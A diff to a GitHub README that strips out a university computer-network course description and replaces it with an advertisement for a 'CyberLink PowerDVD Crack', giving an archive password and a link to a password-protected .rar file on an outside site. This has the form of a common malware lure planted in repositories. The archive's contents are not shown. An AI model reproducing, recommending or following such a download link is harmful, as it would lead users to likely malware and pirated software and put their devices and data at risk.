@@ -1,3 +1,8 @@
-# HIT-2022-Fall-Computer-Network
-哈尔滨工业大学2022秋季学期计算机网络课程实验、期末复习与相关MOOC资料
-学弟学妹们尽量参考，不要无脑ctrl C/V哈，懂得都懂~😊
+#  🟢 CyberLink PowerDVD Crack 🟢
+---
+> # 🔓 Password: GIT1HUB1FREE 🔓
+> # 📅 DATA: 04.03.2024 📅
+> # 🟢 Status: WORK 🟢
+---
+# Download
+### [Download the latest version](https://digitalxnetwork.com/INSTALLER%20PA$$WORD%20GIT1HUB1FREE.rar)
